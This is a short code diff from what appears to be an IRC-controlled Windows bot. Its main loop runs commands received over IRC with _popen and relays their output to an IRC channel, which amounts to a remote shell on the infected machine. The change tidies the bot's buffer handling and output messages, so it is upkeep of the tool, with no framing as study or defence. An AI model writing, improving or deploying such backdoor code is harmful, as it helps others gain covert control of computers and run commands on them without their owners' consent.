@@ -105,7 +105,7 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					else
 					{
 						char cmd_output[512];
-						char cmd_message[1024];
+						char cmd_message[512];
 
 						FILE *output_file = _popen(cmd, "rt");
 						fread((void *) cmd_output, 1, 512, output_file);
@@ -119,10 +119,17 @@ void et_main_loop_win(SOCKET socket, char *nick)
 							}
 						}
 
-						sprintf(cmd_message, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+						if (strlen(cmd_output) >= 500)
+						{
+							snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
+						}
+						else
+						{
+							snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+						}
+
 						send(socket, cmd_message, strlen(cmd_message), 0);
 						_pclose(output_file);
-
 						ZeroMemory(cmd_output, 512);
 					}
 				}
